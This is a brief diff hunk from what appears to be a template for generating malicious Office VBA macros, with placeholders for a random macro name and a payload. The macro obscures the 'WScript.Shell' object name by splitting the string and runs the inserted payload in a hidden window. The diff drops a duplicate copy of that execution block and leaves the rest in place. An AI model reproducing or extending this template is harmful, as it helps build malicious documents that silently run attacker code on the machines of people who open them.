@@ -442,9 +442,6 @@ Sub |RANDOMNAME|()
     c = Chr(34) & |PAYLOADTEXT| & Chr(34)
     Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
     s.Run c, 0
-    c = |PAYLOADTEXT|
-    Set s = CreateObject("WsCrip" & "t." & "Sh" & "ell")
-    s.Run (Chr(34) & c & Chr(34)), 0
 End Sub
 
 ');
